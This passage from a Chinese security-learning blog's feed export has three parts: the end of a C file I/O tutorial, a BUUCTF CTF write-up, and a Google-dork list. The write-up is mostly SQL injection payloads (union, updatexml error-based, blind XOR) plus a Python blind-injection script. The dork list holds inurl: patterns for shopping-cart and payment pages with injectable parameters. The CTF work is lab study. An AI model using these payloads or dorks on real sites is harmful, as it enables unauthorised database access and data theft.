<p>首先，<strong>fscanf()</strong> 方法只读取了 <strong>This</strong>，因为它在后边遇到了一个空格。其次，调用 <strong>fgets()</strong> 读取剩余的部分，直到行尾。最后，调用 <strong>fgets()</strong> 完整地读取第二行。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">char</span> buff[<span class="number">500</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">"D:\\CC\\test.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"1: %s\n"</span>, buff );</span><br><span class="line"> </span><br><span class="line">   fgets(buff, <span class="number">500</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"2: %s\n"</span>, buff );</span><br><span class="line">   </span><br><span class="line">   fgets(buff, <span class="number">500</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"3: %s\n"</span>, buff );</span><br><span class="line">   fclose(fp);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/Xkj3GKyhfNYbeBq.png" alt="image-20210522115752871"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	FILE * fp &#x3D; NULL;</span><br><span class="line">	char str[3][10],temp[10]; &#x2F;&#x2F;str是用来存放字符串的二维数组，temp是临时数组</span><br><span class="line">	int i,j,k,n&#x3D;3;</span><br><span class="line">	printf(&quot;Enter strings:\n&quot;);  &#x2F;&#x2F;提示输入字符串</span><br><span class="line">	for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">		gets(str[i]); &#x2F;&#x2F;输入字符串</span><br><span class="line">	for(i&#x3D;0;i&lt;n-1;i++)   &#x2F;&#x2F;用选择法对字符串排序</span><br><span class="line">	&#123;</span><br><span class="line">		k&#x3D;i;</span><br><span class="line">		for(j&#x3D;i+1;j&lt;n;j++)</span><br><span class="line">			if(strcmp(str[k],str[j])&gt;0)</span><br><span class="line">				k&#x3D;j;</span><br><span class="line">		if(k!&#x3D;i)</span><br><span class="line">		&#123;</span><br><span class="line">			strcpy(temp,str[i]);</span><br><span class="line">			strcpy(str[i],str[k]);</span><br><span class="line">			strcpy(str[k],temp);</span><br><span class="line">		&#125;</span><br><span class="line">	 fp&#x3D;fopen(&quot;D:\\CC\\test.txt&quot;,&quot;w&quot;);</span><br><span class="line">		printf(&quot;\nThe new sequence:\n&quot;);</span><br><span class="line">		for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			fputs(str[i],fp);fputs(&quot;\n&quot;,fp); &#x2F;&#x2F;向磁盘文件写一个字符串，然后输出一个换行符</span><br><span class="line">			printf(&quot;%s\n&quot;,str[i]);       &#x2F;&#x2F;在屏幕上显示</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/RZ6tPE3udhq4bB5.png" alt="image-20210522120550875"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>因为之前学过类似语言，基础学习起来比较快。</p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>成长之路</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】web SQL注入篇</title>
    <url>/posts/73.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">记录buuctf web中SQL注入学习   简单题目未写</span><br></pre></td></tr></table></figure></div>



<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>1、万能密码注入</p>
<p><img src="https://i.loli.net/2021/05/18/xEHvRa1UesJMAZh.png" alt="image-20210518194946967"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table words to words2; </span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br><span class="line"> alter table words change flag id varchar(100);</span><br><span class="line">  show tables; </span><br><span class="line">  show columns from words;#</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/18/h8DMFSX9lUPiEcT.png" alt="image-20210518200458235"></p>
<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>1、万能密码注入 </p>
<blockquote>
<p>‘ or 1=1 #</p>
</blockquote>
<p><img src="https://i.loli.net/2021/05/18/auKdHVZUbBPzYjO.png" alt="image-20210518205129073"></p>
<p>2、找字段</p>
<blockquote>
<p>‘ order by 3 #</p>
</blockquote>
<blockquote>
<p>’ union select 1,2,3; #  找回显</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure></div>

<p>3、爆表</p>
<p><img src="https://i.loli.net/2021/05/18/LyIcbRsn7Z8E5Wa.png" alt="image-20210518205534376"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;geekuser&#39; #</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/18/ObyQArLXgiFwNjc.png" alt="image-20210518205747038"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39; #</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span><br><span class="line"></span><br><span class="line">2&#39; uunionnion sselectelect 1,2,group_concat(id,username,passwoordd) ffromrom l0ve1ysq1 #</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/18/1xIhzTnAyQBokmE.png" alt="image-20210518210415619"></p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>1、用hackbar进行构造传参测试</p>
<p><img src="https://i.loli.net/2021/05/19/kDm1vPCcjuZEKsa.png" alt="image-20210519193037797"></p>
<p>2、测试限制的传参</p>
<p><img src="https://i.loli.net/2021/05/19/fvqXaKy9bsFJcRu.png" alt="image-20210519193407564"></p>
<p><img src="https://i.loli.net/2021/05/19/fvqXaKy9bsFJcRu.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/19/zoRVL5PbWcvUFuE.png" alt="image-20210519193346862"></p>
<p><img src="https://i.loli.net/2021/05/19/Nc3C68ZhVH7Dmzg.png" alt="image-20210519193550883"></p>
<p>3、爆库、爆表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(database()))),1))%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/RoANXceS9qKsixB.png" alt="image-20210519193647543"></p>
<p>4、爆表</p>
<p><img src="https://i.loli.net/2021/05/19/Iexyc6Bk2hdrpQi.png" alt="image-20210519194502176"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23</span><br></pre></td></tr></table></figure></div>

<p>5、爆字段</p>
<p><img src="https://i.loli.net/2021/05/19/yP6BVrEXRkQcbLC.png" alt="image-20210519194647159"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))),1))%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/92Xso48euzthOF6.png" alt="image-20210519195854553"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1))),1))%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/p9o1zSfg4OayNn3.png" alt="image-20210519200015966"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password)))from(H4rDsq1))),1))%23</span><br><span class="line"></span><br><span class="line">左部分flag&#123;dc3aeb0f-4601-4e42-96da-71</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/TQVSLBw4UW6pzJ3.png" alt="image-20210519200238582"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1))),1))%23</span><br><span class="line"></span><br><span class="line">左部分flag&#123;dc3aeb0f-4601-4e42-96da-71</span><br><span class="line">右部分数据f-4601-4e42-96da-718fe313ce10&#125;</span><br><span class="line">对比删去相同部分8fe313ce10&#125;</span><br><span class="line">flag&#123;dc3aeb0f-4601-4e42-96da-718fe313ce10&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p><strong>1、测试注入点</strong></p>
<p><img src="https://i.loli.net/2021/05/20/XoO7SEG1MrxgHTa.png" alt="image-20210520144727337"></p>
<p><strong>2、发现源码里面有base32到base64的解密</strong></p>
<p><img src="https://i.loli.net/2021/05/20/gwAZyuOrmHGUFdl.png" alt="image-20210520144925189"></p>
<p><img src="https://i.loli.net/2021/05/20/m1PiLVdIaz3ROG6.png" alt="image-20210520144957880"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br><span class="line">判断有一个user表</span><br></pre></td></tr></table></figure></div>

<p><strong>3、Order by 找字段</strong></p>
<p><img src="https://i.loli.net/2021/05/20/R9b6v1wUym2OuPW.png" alt="image-20210520145102648"></p>
<p><img src="https://i.loli.net/2021/05/20/XsmIcLrkgHfd2qV.png" alt="image-20210520145256523"></p>
<p><strong>4、用联合查询创建虚拟表进行登录</strong></p>
<p><img src="https://i.loli.net/2021/05/20/gxcSjtfFTdo2LYy.png" alt="image-20210520145408128"></p>
<p><img src="https://i.loli.net/2021/05/20/z7nxthYDpHZoUOi.png" alt="image-20210520145445923"></p>
<p><img src="https://i.loli.net/2021/05/20/XeVtDqG6Bp73c9L.png" alt="image-20210520145534170"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1&#39; union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;#&amp;pw&#x3D;admin</span><br><span class="line"></span><br><span class="line">这里比较坑的就是md5加密没有提示</span><br></pre></td></tr></table></figure></div>

<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p><strong>1、最后一题一般很难，上面提示了用盲注</strong></p>
<p><img src="https://i.loli.net/2021/05/22/YzgEm86HjXPwBGL.png" alt="image-20210522195040262"></p>
<p><strong>2、测试一下</strong></p>
<p><img src="https://i.loli.net/2021/05/22/wGDRPVtTczUjkFB.png" alt="image-20210522195136419"></p>
<p><img src="https://i.loli.net/2021/05/22/GzBxDLQc6P5alU9.png" alt="image-20210522195203898"></p>
<p><img src="https://i.loli.net/2021/05/22/IjKcVoyqpd1BDAi.png" alt="image-20210522200249213"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&#x3D;105)^1</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/ks6P39AHoLIMNKU.png" alt="image-20210522200324873"></p>
<p>手工注入太麻烦了，找了个网上的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://83091d3b-98bc-4cb3-857f-b7ff224e4257.node3.buuoj.cn/search.php?"</span></span><br><span class="line">temp = &#123;<span class="string">"id"</span>: <span class="string">""</span>&#125;</span><br><span class="line">column = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        <span class="comment"># 库名</span></span><br><span class="line">        temp[<span class="string">"id"</span>] = <span class="string">"1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1"</span> %(i,mid)</span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment"># temp["id"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1" %(i, mid)</span></span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment"># temp["id"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1" %(i,mid)</span></span><br><span class="line">        <span class="comment"># 内容</span></span><br><span class="line">        <span class="comment"># temp["id"] = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1" %(i,mid)</span></span><br><span class="line">        r = requests.get(url, params=temp)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        print(low, high, mid, <span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    column += chr(mid)</span><br><span class="line">    print(column)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"All:"</span>, column)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/z7qB5MWj1KPYm4i.png" alt="image-20210522201035981"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">结果：</span><br><span class="line">All: cl4y_is_really_amazing,welcome_to_my_blog,http:&#x2F;&#x2F;www.cl4y.top,http:&#x2F;&#x2F;www.cl4y.top,http:&#x2F;&#x2F;www.cl4y.top,http:&#x2F;&#x2F;www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;15c4b1bf-0f2a-4b60-8063-07d6f687a332&#125;</span><br></pre></td></tr></table></figure></div>

<p>mochu7”||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=’users’))),1))#</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">flag&#123;06534856-955b-41e7-a415-933d31e2b3f4&#125;</span><br><span class="line">&#125;4f3b2e13d339-514a-7e14-b559-65</span><br><span class="line">3d31e2b3f4&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌语法搜索关键字（打包）</title>
    <url>/posts/77.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>语法格式例如：inurl: about.php?cartID=</p>
<hr>
<ul>
<li><input disabled="" type="checkbox"> <p>about.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>accinfo.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>acclogin.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add_cart.php?num=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addcart.php? addItem.php add-to-cart.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addToCart.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addtomylist.php?ProdId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>adminEditProductFields.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>advSearch_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate-agreement.cfm?storeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliates.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ancillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>archive.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>phpx?PageID basket.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Book.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_view.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>BookDetails.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse_item_details.php Browse_Item_Details.php?Store_Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bycategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cardinfo.php?card=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?cart_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_additem.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_validate.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cartadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat.php?iCat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php?CatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_item.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_main.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categorydisplay.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?UserID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout_confirmed.php?order_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout1.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_listCategoriesAndProducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optEmailToFriendForm.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optReviewReadExec.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_viewItem.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comments_form.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>contact.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customerService.php?****ID1=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>description.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Press_Release_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Product_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Service_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>displayproducts.php downloadTrial.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailproduct.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailToFriend.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faqs.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>feedback.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>freedownload.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fullDisplay.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>getbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>GetItems.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>giftDetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>info.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?eid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?model=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?prodtype=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?shopcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_details.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?maingroup item_show.php?code_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemDesc.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetail.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetails.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>learnmore.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>links.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>List.php?CatID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>listcategoriesandproducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modline.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>myaccount.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>OrderForm.php?Cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?PartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>payment.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdetail.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>powersearch.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>price.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>privacy.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodbycat.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodetails.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodlist.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProdID=</p>
</li>
